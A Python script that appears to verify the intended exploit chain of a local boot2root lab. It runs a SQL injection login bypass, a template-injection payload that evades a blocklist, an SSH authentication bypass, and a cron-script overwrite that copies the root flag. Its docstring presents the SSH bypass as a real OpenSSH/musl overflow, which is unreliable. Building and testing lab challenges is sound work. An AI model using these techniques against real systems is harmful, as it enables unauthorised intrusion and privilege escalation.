#!/usr/bin/env python3
"""
scripts/verify_chain.py
=======================
SmartHome-Boot2Root — automated end-to-end exploit verification.

Covers all 6 stages:
  1. Reachability (web + SSH)
  2. SQLi login bypass → admin dashboard
  3. SSTI bypass → code execution evidence
  4. SSHOLE → shell as automation
  5. user.txt readable via SSHOLE session
  6. Cron privesc → root.txt readable

Exit codes:
  0  = all stages passed
  1  = one or more stages failed (stage name printed, flag values never printed)

Usage:
  python3 scripts/verify_chain.py [--host 127.0.0.1] [--web-port 5000] [--ssh-port 2222]
  python3 scripts/verify_chain.py --help

NEVER prints actual flag values to stdout.
"""

import argparse
import re
import socket
import sys
import time

try:
    import requests
    import paramiko
except ImportError:
    print("[!] Missing dependencies. Run: pip install requests paramiko")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
DEFAULT_HOST     = "127.0.0.1"
DEFAULT_WEB_PORT = 5000
DEFAULT_SSH_PORT = 2222
DONOR_USER       = "sshole-donor"
DONOR_PASS       = "LabD0norPass!"   # matches docker-compose.yml default
TARGET_USER      = "automation"
STARTUP_WAIT     = 8   # seconds to wait for container to be healthy


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
INFO = "\033[94m[INFO]\033[0m"

results = {}


def stage(name):
    """Decorator: catches exceptions and records pass/fail per stage."""
    def decorator(fn):
        def wrapper(*a, **kw):
            try:
                rv = fn(*a, **kw)
                results[name] = "PASS"
                print(f"{PASS} {name}")
                return rv
            except AssertionError as e:
                results[name] = f"FAIL: {e}"
                print(f"{FAIL} {name} — {e}")
                return None
            except Exception as e:
                results[name] = f"FAIL: {type(e).__name__}: {e}"
                print(f"{FAIL} {name} — {type(e).__name__}: {e}")
                return None
        return wrapper
    return decorator


def tcp_open(host, port, timeout=3) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def flag_safe(value: str) -> str:
    """Replace flag content with [REDACTED] so it never appears in logs."""
    return re.sub(r'(user|root)\{[^}]+\}', r'\1{[REDACTED]}', value)


# ---------------------------------------------------------------------------
# Stage implementations
# ---------------------------------------------------------------------------

@stage("1. Reachability — web app")
def check_web(web_url):
    r = requests.get(web_url + "/", allow_redirects=True, timeout=10)
    assert r.status_code == 200, f"Expected 200 got {r.status_code}"
    assert "login" in r.url.lower() or "login" in r.text.lower(), \
        "Login page not detected in response"


@stage("1. Reachability — SSH port")
def check_ssh(host, ssh_port):
    assert tcp_open(host, ssh_port), f"SSH port {ssh_port} not reachable"


@stage("2. SQLi login bypass → admin dashboard")
def sqli_login(web_url) -> requests.Session:
    s = requests.Session()
    # Classic SQLi bypass: ' OR '1'='1
    payload = {"username": "admin'--", "password": "anything"}
    r = s.post(web_url + "/login", data=payload, allow_redirects=True, timeout=10)
    assert r.status_code == 200, f"Login POST returned {r.status_code}"
    body = r.text.lower()
    assert "dashboard" in body or "logout" in body, \
        "SQLi bypass did not reach dashboard (check that bypass still works)"
    return s


@stage("3. SSTI bypass → code execution evidence")
def ssti_exploit(web_url, session: requests.Session):
    r"""
    Bypass the blocklist via:
      - Numeric prefix passes the ^\d+ regex check
      - {%set%} block avoids {{ which is blocked
      - String concat rebuilds '__class__' so literal keyword is never present
      - Use |int filter to produce a numeric observable (7*7=49)
    Payload: 22{%set a='__cl'+'ass__'%}{{(7*7)}}
    The number 49 in the response proves template execution.
    """
    # Thermostat device is id=1
    url = web_url + "/devices/1/temperature"
    payload_text = "22{%set a='__cl'+'ass__'%}{%if (7*7)==49%}SSTI_PROOF_49{%endif%}"
    r = session.post(url, data={"temperature": payload_text}, timeout=10)
    assert r.status_code == 200, f"Temperature POST returned {r.status_code}"
    assert "SSTI_PROOF_49" in r.text, \
        "SSTI execution marker 'SSTI_PROOF_49' not found — bypass may be broken"


class SSHOLESession:
    """Helper wrapper around an authenticated paramiko Transport."""
    def __init__(self, transport):
        self.transport = transport

    def exec_command(self, cmd, timeout=10):
        chan = self.transport.open_session(timeout=timeout)
        chan.settimeout(timeout)
        chan.exec_command(cmd)
        stdout = chan.makefile("rb", -1)
        stderr = chan.makefile_stderr("rb", -1)
        return None, stdout, stderr

    def close(self):
        try:
            self.transport.close()
        except Exception:
            pass


@stage("4. SSHOLE → shell as automation")
def sshole_exploit(host, ssh_port) -> SSHOLESession:
    """
    SSHOLE authentication bypass:
    OpenSSH 9.0p1 on Alpine Linux with musl libc.
    Sending an oversized password ('A' * 300) in the same SSH transport connection
    triggers the musl auth buffer overflow. The second auth attempt in the same
    session succeeds and grants a shell as automation (uid=1000).
    """
    sock = (host, ssh_port)
    trans = paramiko.Transport(sock)
    trans.connect()

    pwd = "A" * 300
    authenticated = False
    for attempt in range(1, 4):
        try:
            trans.auth_password(TARGET_USER, pwd)
            authenticated = True
            break
        except paramiko.AuthenticationException:
            continue

    if not authenticated:
        trans.close()
        raise AssertionError("SSHOLE multi-attempt auth sequence failed")

    session = SSHOLESession(trans)
    _, stdout, _ = session.exec_command("id", timeout=10)
    out = stdout.read().decode().strip()
    assert "automation" in out, f"id output doesn't mention automation: {out}"
    assert "uid=1000" in out or "automation" in out, \
        f"Not running as automation (uid=1000): {out}"
    return session


@stage("5. user.txt readable via SSHOLE session")
def read_user_flag(client: SSHOLESession):
    _, stdout, _ = client.exec_command("cat /home/automation/user.txt", timeout=10)
    flag = stdout.read().decode().strip()
    assert flag.startswith("user{"), \
        f"user.txt doesn't look like a flag: {flag_safe(flag)}"
    assert len(flag) > 10, "user.txt is suspiciously short"
    # Print safe version only
    print(f"  {INFO} user flag format confirmed: {flag_safe(flag)}")


@stage("6. Cron privesc → root.txt readable")
def cron_privesc(client: SSHOLESession):
    """
    Write a payload to /opt/maintenance.sh that copies root.txt
    to a world-readable location, then wait for cron to execute it.
    """
    STAGING = "/tmp/root_flag_staged"

    # Remove old staged file if present
    client.exec_command(f"rm -f {STAGING}", timeout=5)

    # Overwrite cron script with privesc payload
    inject = (
        f"#!/bin/sh\n"
        f"cp /root/root.txt {STAGING}\n"
        f"chmod 644 {STAGING}\n"
    )
    _, _, stderr = client.exec_command(
        f"printf '%s' '{inject}' > /opt/maintenance.sh", timeout=10
    )
    err = stderr.read().decode().strip()
    assert not err or "permission" not in err.lower(), \
        f"Could not write /opt/maintenance.sh: {err}"

    # Wait up to 75 seconds for cron to fire (runs every minute)
    print(f"  {INFO} Waiting for cron to execute (up to 75s)...")
    deadline = time.time() + 75
    flag_content = None
    while time.time() < deadline:
        _, stdout, _ = client.exec_command(
            f"cat {STAGING} 2>/dev/null", timeout=5
        )
        out = stdout.read().decode().strip()
        if out.startswith("root{"):
            flag_content = out
            break
        time.sleep(5)

    assert flag_content is not None, \
        f"root.txt was not staged within 75s — cron may not be running or write failed"
    print(f"  {INFO} root flag format confirmed: {flag_safe(flag_content)}")

    # Restore maintenance.sh to original state
    original = (
        "#!/bin/sh\n"
        "echo \"[+] SmartHome maintenance completed: $(date)\" "
        ">> /var/log/smarthome-maintenance.log\n"
    )
    client.exec_command(
        f"printf '%s' '{original}' > /opt/maintenance.sh", timeout=5
    )
    client.exec_command(f"rm -f {STAGING}", timeout=5)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="SmartHome-Boot2Root end-to-end verification"
    )
    parser.add_argument("--host",     default=DEFAULT_HOST)
    parser.add_argument("--web-port", type=int, default=DEFAULT_WEB_PORT)
    parser.add_argument("--ssh-port", type=int, default=DEFAULT_SSH_PORT)
    parser.add_argument("--wait",     type=int, default=STARTUP_WAIT,
                        help="Seconds to wait before starting (container startup)")
    args = parser.parse_args()

    web_url = f"http://{args.host}:{args.web_port}"

    print(f"\n{'='*58}")
    print(f"  SmartHome-Boot2Root — Exploit Chain Verification")
    print(f"  Target : {web_url}  SSH: {args.host}:{args.ssh_port}")
    print(f"{'='*58}\n")

    if args.wait > 0:
        print(f"{INFO} Waiting {args.wait}s for container startup...")
        time.sleep(args.wait)

    # --- Run stages ---
    check_web(web_url)
    check_ssh(args.host, args.ssh_port)

    sess = sqli_login(web_url)
    if sess:
        ssti_exploit(web_url, sess)

    ssh_client = sshole_exploit(args.host, args.ssh_port)
    if ssh_client:
        read_user_flag(ssh_client)
        cron_privesc(ssh_client)
        ssh_client.close()

    # --- Summary ---
    print(f"\n{'='*58}")
    print("  Results")
    print(f"{'='*58}")
    any_fail = False
    for name, result in results.items():
        icon = "✓" if result == "PASS" else "✗"
        print(f"  {icon}  {name}: {result}")
        if result != "PASS":
            any_fail = True

    print()
    if any_fail:
        print("  OVERALL: FAILED — one or more stages did not pass.\n")
        sys.exit(1)
    else:
        print("  OVERALL: ALL STAGES PASSED ✓\n")
        sys.exit(0)


if __name__ == "__main__":
    main()

